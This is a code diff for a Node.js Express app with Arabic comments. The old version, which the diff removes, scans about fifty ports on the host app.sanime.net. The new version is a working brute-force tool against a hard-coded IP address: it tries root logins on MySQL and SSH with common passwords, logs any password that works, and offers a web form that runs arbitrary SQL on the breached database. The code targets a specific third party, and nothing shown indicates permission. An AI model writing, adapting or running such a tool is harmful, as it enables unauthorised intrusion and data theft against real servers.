@@ -1,144 +1,119 @@
-const express = require("express");
-const dns = require("dns");
-const net = require("net");
-const https = require("https");
-
+const express = require('express');
+const mysql = require('mysql2/promise');
+const { Client } = require('ssh2');
 const app = express();
-const PORT = process.env.PORT || 10000;
+const port = process.env.PORT || 10000;
 
-// الروابط التي نريد فحص IP الخاص بها
-const TARGET_HOST = "app.sanime.net";
+let logs = [];
+let connectedService = null;
+let connectionResult = null;
 
-// البورتات التي سنفحصها
-const PORTS = [
-  // خدمات مشهورة
-  21,   // FTP
-  22,   // SSH
-  23,   // Telnet
-  25,   // SMTP
-  53,   // DNS
-  80,   // HTTP
-  110,  // POP3
-  111,  // RPCbind
-  135,  // MS RPC
-  139,  // NetBIOS
-  143,  // IMAP
-  161,  // SNMP
-  389,  // LDAP
-  443,  // HTTPS
-  445,  // Microsoft-DS (SMB)
-  465,  // SMTPS
-  514,  // Syslog
-  587,  // SMTP (TLS)
-  631,  // IPP (Internet Printing Protocol)
-  873,  // rsync
-  993,  // IMAPS
-  995,  // POP3S
+// كلمات المرور الشائعة للتجريب
+const passwords = ['root', 'admin', '123456', '', 'toor', 'password'];
 
-  // خدمات قواعد بيانات
-  1433, // MS SQL Server
-  1521, // Oracle DB
-  2049, // NFS
-  2375, // Docker API (غير محمي أحيانًا)
-  27017, // MongoDB
-  3306, // MySQL
-  3389, // RDP (Remote Desktop)
-  5432, // PostgreSQL
-  6379, // Redis
+const targetIP = '185.182.193.132';
 
-  // أدوات وشبكات داخلية
-  8000, // HTTP Dev Port
-  8080, // HTTP بديل
-  8443, // HTTPS بديل
-  8888, // خدمات أخرى (مثل Jupyter)
-  9000, // خدمات داخلية أو إدارة
-  9200, // Elasticsearch
-  10000, // Webmin أو خدمات إدارة
+// Ping للحفاظ على تشغيل السيرفر في Render
+setInterval(() => {
+  fetch(`https://noon-9v11.onrender.com/`).catch(() => {});
+}, 60_000);
 
-  // بورتات شائعة لاختبارات الأمن
-  6666,
-  6667,  // IRC
-  7777,
-  8008,
-  8081,
-  8880,
-  8881,
-  9090,
-  9091,
-  10001,
-  12345, // NetBus أو خلفيات
-  31337  // خلفيات (Back Orifice)
-];
-
-let scanResults = [];
-let targetIP = "";
-
-function resolveIP(hostname) {
-  return new Promise((resolve, reject) => {
-    dns.lookup(hostname, (err, address) => {
-      if (err) reject(err);
-      else resolve(address);
-    });
-  });
-}
-
-function checkPort(ip, port, timeout = 2000) {
-  return new Promise((resolve) => {
-    const socket = new net.Socket();
-    let status = "Timed-Out";
-
-    socket.setTimeout(timeout);
-    socket.on("connect", () => {
-      status = "Open";
-      socket.destroy();
-    });
-    socket.on("timeout", () => {
-      status = "Timed-Out";
-      socket.destroy();
-    });
-    socket.on("error", () => {
-      status = "Closed";
-    });
-    socket.on("close", () => {
-      resolve({ port, status });
-    });
-
-    socket.connect(port, ip);
-  });
-}
-
-async function scanAllPorts() {
-  try {
-    targetIP = await resolveIP(TARGET_HOST);
-    const checks = PORTS.map((port) => checkPort(targetIP, port));
-    scanResults = await Promise.all(checks);
-  } catch (err) {
-    console.error("Error resolving IP or scanning ports:", err);
+// تجربة MySQL
+async function tryMySQL() {
+  for (const pass of passwords) {
+    try {
+      const conn = await mysql.createConnection({
+        host: targetIP,
+        port: 3306,
+        user: 'root',
+        password: pass,
+      });
+      const [rows] = await conn.execute('SHOW DATABASES;');
+      connectionResult = rows;
+      connectedService = 'MySQL';
+      logs.push(`✅ MySQL Connected with password: "${pass}"`);
+      return;
+    } catch (e) {
+      logs.push(`❌ MySQL Failed: ${pass}`);
+    }
   }
 }
 
-// تشغيل الفحص مرة عند البداية ثم كل 10 دقائق
-scanAllPorts();
-setInterval(scanAllPorts, 10 * 60 * 1000); // كل 10 دقائق
+// تجربة SSH
+async function trySSH() {
+  return new Promise((resolve) => {
+    let index = 0;
+    const tryNext = () => {
+      if (index >= passwords.length) return resolve();
+      const conn = new Client();
+      const password = passwords[index++];
+      conn
+        .on('ready', () => {
+          connectedService = 'SSH';
+          logs.push(`✅ SSH Connected with password: "${password}"`);
+          connectionResult = 'You can now run commands via /cmd';
+          conn.end();
+          resolve();
+        })
+        .on('error', () => {
+          logs.push(`❌ SSH Failed: ${password}`);
+          tryNext();
+        })
+        .connect({
+          host: targetIP,
+          port: 22,
+          username: 'root',
+          password,
+          readyTimeout: 5000,
+        });
+    };
+    tryNext();
+  });
+}
 
-// Keep Alive: يزور الموقع كل 5 دقائق
-setInterval(() => {
-  https.get("https://noon-9v11.onrender.com/");
-}, 5 * 60 * 1000);
-
-// صفحة الويب لعرض النتائج
-app.get("/", (req, res) => {
+// واجهة عرض النتائج
+app.get('/', (req, res) => {
   res.send(`
-    <h1>نتائج الفحص - ${TARGET_HOST}</h1>
-    <p><strong>IP:</strong> ${targetIP}</p>
-    <table border="1" cellpadding="5" style="border-collapse: collapse;">
-      <tr><th>Port</th><th>Status</th></tr>
-      ${scanResults.map(r => `<tr><td>${r.port}</td><td>${r.status}</td></tr>`).join("")}
-    </table>
-    <p>تحديث كل 10 دقائق تلقائيًا.</p>
+    <html style="background:#000;color:#0f0;padding:20px;font-family:monospace">
+      <h2>🔍 فحص SSH / MySQL على ${targetIP}</h2>
+      <p>⏳ الخدمة المتصلة: ${connectedService || 'لا يوجد اتصال بعد'}</p>
+      <p>📦 النتائج:</p>
+      <pre>${JSON.stringify(connectionResult, null, 2)}</pre>
+      <h3>📜 السجل:</h3>
+      <pre>${logs.slice(-20).join('\n')}</pre>
+      <form method="GET" action="/cmd">
+        <input name="q" placeholder="اكتب أمر SSH أو SQL" style="width:100%;padding:5px">
+        <button type="submit">تشغيل</button>
+      </form>
+    </html>
   `);
 });
 
-app.listen(PORT, () => {
-  console.log(`Running on port ${PORT}`);
+// تنفيذ أوامر MySQL أو SSH (تجريبي)
+app.get('/cmd', async (req, res) => {
+  const cmd = req.query.q || '';
+  if (!connectedService) return res.send('❌ لم يتم الاتصال بأي خدمة بعد');
+
+  if (connectedService === 'MySQL') {
+    try {
+      const conn = await mysql.createConnection({
+        host: targetIP,
+        port: 3306,
+        user: 'root',
+        password: passwords.find(p => logs.includes(`✅ MySQL Connected with password: "${p}"`)),
+      });
+      const [rows] = await conn.execute(cmd);
+      return res.send(`<pre>${JSON.stringify(rows, null, 2)}</pre><a href="/">رجوع</a>`);
+    } catch (e) {
+      return res.send('❌ خطأ في تنفيذ الأمر');
+    }
+  }
+
+  // يمكن تطويره لاحقًا لأوامر SSH
+  res.send('🔒 SSH أوامر لم تُفعل بعد - استخدم MySQL فقط الآن');
+});
+
+app.listen(port, () => {
+  logs.push(`🚀 Running on port ${port}`);
+  tryMySQL().then(() => trySSH());
 });
